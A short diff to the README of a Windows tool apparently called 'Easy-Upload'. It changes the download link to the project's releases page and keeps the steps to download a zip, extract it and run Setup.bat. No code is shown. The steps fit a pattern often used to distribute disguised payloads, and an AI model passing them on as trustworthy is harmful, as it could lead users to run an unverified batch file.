@@ -3,7 +3,7 @@ Upload any file with no limits in two just clicks. (Windows 10/11)
 
 # How to use
 
-<div>	<a> ♥ Download the <a href="https://github.com/WindowsTools2077/Easy-Upload/releases/download/EZUpload/Easy.Upload.7z">Zip file</a>
+<div>	<a> ♥ Download the <a href="https://github.com/WindowsTools2077/Easy-Upload/releases/">Zip file</a>
 <div>	<a> ♥ Extract the files</a>
 <div>	<a> ♥ Run the Setup.bat</a>
   
